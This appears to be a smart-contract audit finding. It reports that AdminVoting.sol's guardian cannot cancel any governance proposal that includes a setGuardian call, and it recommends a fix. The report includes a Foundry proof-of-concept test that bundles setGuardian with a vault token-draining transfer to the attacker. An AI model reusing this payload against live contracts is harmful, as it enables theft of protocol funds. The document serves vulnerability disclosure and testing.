# Guardian will not be able to cancel a malicious proposal 

## Summary
This bug report highlights a vulnerability in the AdminVoting.sol smart contract. The contract allows a malicious actor to bypass the guardian's ability to cancel proposals by including a setGuardian call in a proposal along with other dangerous actions. This compromises the guardian's ability to protect the protocol and puts protocol funds and parameters at risk. A proof of concept is provided in the report, along with a recommendation to modify the _containsSetGuardianPayload() function to only block cancellation for single-action setGuardian proposals. This will ensure that the guardian can still cancel multi-action proposals even if they include setGuardian.

## Details
## AdminVoting Vulnerability Report

## Context
`AdminVoting.sol#L362-L363`

## Summary
A malicious actor can bypass guardian cancellation protection by bundling malicious actions with `setGuardian` in a proposal. The guardian cannot cancel any proposal containing `setGuardian`, even when it includes other dangerous actions.

## Vulnerability Details
In `AdminVoting.sol`, the `_containsSetGuardianPayload()` function checks for `setGuardian` calls in **ALL** actions:

```solidity
function _containsSetGuardianPayload(uint256 payloadLength, Action[] memory payload) {
    for (uint256 i; i < payloadLength; i++) {
        if (sig == IBimaCore.setGuardian.selector) return true; // @audit-poc
    }
    return false;
}
```

This allows an attacker to:
1. Create a proposal with multiple actions.
2. Include `setGuardian` anywhere in the payload.
3. Add malicious actions like draining funds.
4. The guardian cannot cancel because of the presence of `setGuardian`.

## Impact
- Guardian's ability to protect the protocol is severely compromised.
- Malicious proposals cannot be cancelled if they include `setGuardian`.
- Protocol funds and parameters are at risk from uncancellable malicious actions.

## Proof of Concept
Copy and run the below test in `test/foundry/dao/AdminVotingTest.t.sol`:

```solidity
function test_guardian_cannot_cancel_malicious_proposal_with_setGuardian() public {
    // First give voting power to attacker (using user1 as attacker)
    vm.prank(users.user1);
    tokenLocker.lock(users.user1, USER1_TOKEN_ALLOCATION / INIT_LOCK_TO_TOKEN_RATIO, 52);
    
    // Create malicious actions including setGuardian
    AdminVoting.Action[] memory maliciousPayload = new AdminVoting.Action[](3);
    
    // First add legitimate-looking action
    maliciousPayload[0].target = address(adminVoting);
    maliciousPayload[0].data = abi.encodeWithSelector(
        AdminVoting.setMinCreateProposalPct.selector,
        UPDT_MIN_CREATE_PROP_PCT // Using existing test constant
    );
    
    // Add setGuardian call anywhere in payload
    maliciousPayload[1].target = address(bimaCore);
    maliciousPayload[1].data = abi.encodeWithSelector(
        IBimaCore.setGuardian.selector,
        users.user1 // Set attacker (user1) as new guardian
    );
    
    // Add malicious action to drain funds
    maliciousPayload[2].target = address(bimaVault);
    maliciousPayload[2].data = abi.encodeWithSelector(
        IBimaVault.transferTokens.selector,
        bimaToken, // Token to transfer
        users.user1, // Receiver (attacker)
        USER1_TOKEN_ALLOCATION // Amount to drain
    );

    // Warp past bootstrap period
    vm.warp(block.timestamp + adminVoting.BOOTSTRAP_PERIOD() + 1);
    
    // Create the malicious proposal
    vm.prank(users.user1);
    uint256 proposalId = adminVoting.createNewProposal(
        users.user1,
        maliciousPayload
    );

    // Guardian notices malicious proposal and tries to cancel
    vm.prank(users.guardian);
    // This should revert because proposal contains setGuardian
    vm.expectRevert("Guardian replacement not cancellable");
    adminVoting.cancelProposal(proposalId);
    
    // The malicious proposal remains active and can still be executed
    // if enough votes are gathered
    assertEq(adminVoting.getProposalProcessed(proposalId), false);
}
```

## Recommendation
Modify `_containsSetGuardianPayload()` to only block cancellation for single-action `setGuardian` proposals:

```solidity
function _containsSetGuardianPayload(uint256 payloadLength, Action[] memory payload) {
    if(payloadLength != 1) return false;
    // ...
    // extra code
}
```

This ensures the guardian can cancel multi-action proposals even if they include `setGuardian`.
